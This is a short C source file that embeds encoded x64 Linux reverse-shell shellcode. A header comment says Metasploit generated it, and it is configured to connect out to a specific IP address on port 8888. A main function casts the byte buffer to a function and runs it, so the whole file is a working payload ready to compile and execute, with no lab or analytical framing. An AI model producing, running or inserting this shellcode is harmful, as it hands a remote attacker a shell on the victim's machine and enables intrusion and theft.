/*
 * linux/x64/shell_reverse_tcp - 119 bytes
 * http://www.metasploit.com
 * Encoder: x64/xor
 * VERBOSE=false, LHOST=128.138.201.120, LPORT=8888, 
 * ReverseConnectRetries=5, ReverseListenerBindPort=0, 
 * ReverseAllowProxy=false, ReverseListenerThreaded=false, 
 * PrependFork=false, PrependSetresuid=false, 
 * PrependSetreuid=false, PrependSetuid=false, 
 * PrependSetresgid=false, PrependSetregid=false, 
 * PrependSetgid=false, PrependChrootBreak=false, 
 * AppendExit=false, InitialAutoRunScript=, AutoRunScript=
 */
unsigned char buf[] = 
"\x48\x31\xc9\x48\x81\xe9\xf6\xff\xff\xff\x48\x8d\x05\xef\xff"
"\xff\xff\x48\xbb\x19\x1b\x4c\x38\x5a\xb1\x2c\xd4\x48\x31\x58"
"\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4\x73\x32\x14\xa1\x30\xb3"
"\x73\xbe\x18\x45\x43\x3d\x12\x26\x64\x6d\x1b\x1b\x6e\x80\xda"
"\x3b\xe5\xac\x48\x53\xc5\xde\x30\xa1\x76\xbe\x33\x43\x43\x3d"
"\x30\xb2\x72\x9c\xe6\xd5\x26\x19\x02\xbe\x29\xa1\xef\x71\x77"
"\x60\xc3\xf9\x97\xfb\x7b\x72\x22\x17\x29\xd9\x2c\x87\x51\x92"
"\xab\x6a\x0d\xf9\xa5\x32\x16\x1e\x4c\x38\x5a\xb1\x2c\xd4";

main() {((void(*)()) buf)();}